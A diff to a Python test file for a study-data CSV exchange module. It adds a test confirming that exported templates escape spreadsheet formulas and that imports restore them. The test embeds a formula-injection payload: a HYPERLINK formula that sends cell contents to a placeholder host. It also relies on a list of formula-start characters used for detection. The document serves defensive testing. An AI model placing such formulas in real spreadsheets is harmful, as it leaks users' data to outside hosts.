@@ -5,7 +5,9 @@ import json
 from datetime import timedelta, timezone
 
 import pytest
+import yaml
 
+from mblab.csvcells import FORMULA_STARTS
 from mblab.exchange import (
     import_file,
     merge_records,
@@ -13,9 +15,11 @@ from mblab.exchange import (
     template_columns,
     write_template_csv,
 )
-from mblab.study import Study, StudyError
+from mblab.plan import generate_plan
+from mblab.schema import ExperimentDefinition
+from mblab.study import Study, StudyError, save_plan, template_text
 
-from .conftest import make_record, write_records
+from .conftest import FIXED_NOW, make_record, write_records
 
 
 def _template_rows(study_dir):
@@ -193,3 +197,27 @@ def test_non_utf8_csv_gets_a_clear_error(study_dir):
     path.write_bytes(path.read_text(encoding="utf-8-sig").encode("cp1252"))
     with pytest.raises(StudyError, match=r'not UTF-8 text.*"CSV UTF-8"'):
         import_file(study, path)
+
+
+def test_template_keeps_formulas_out_and_imports_them_back(tmp_path):
+    data = yaml.safe_load(template_text())
+    formula = '=HYPERLINK("https://example.invalid/?d="&A1,"Open")'
+    data["tasks"][0]["prompt"] = formula  # T1, e.g. from a study file shared by someone else
+    root = tmp_path / "formula"
+    root.mkdir()
+    (root / "experiment.yaml").write_text(yaml.safe_dump(data), encoding="utf-8")
+    save_plan(
+        generate_plan(ExperimentDefinition.model_validate(data), now=FIXED_NOW),
+        root / "plan.json",
+    )
+    study, path, rows = _template_rows(root)
+    for row in rows:
+        assert not [v for v in row.values() if v and v[0] in FORMULA_STARTS], row
+    row = next(r for r in rows if r["task_id"] == "T1")
+    assert row["prompt_text"] == "'" + formula
+    row.update(timestamp="2026-11-20T10:00:00+09:00", client_version="1.0", response_text="A")
+    _write_rows(path, [row])
+    result = import_file(study, path)
+    assert result.errors == []
+    (record,) = result.records
+    assert record.prompt_text == formula and not record.excluded  # no deviation needed
